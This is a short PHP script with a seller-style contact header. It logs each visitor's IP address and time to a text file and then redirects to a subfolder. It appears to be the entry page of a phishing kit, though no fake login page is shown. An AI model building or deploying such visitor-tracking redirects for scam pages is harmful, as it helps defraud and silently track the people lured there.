<?php

//✨ CONTACT ME HERE
//✨ TELEGRAM:  @TELEGRAM
//✨ ICQ : @TELEGRAM



$ip = getenv("REMOTE_ADDR");
$file = fopen("Visit.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="ap";
header("location:$src");
?>
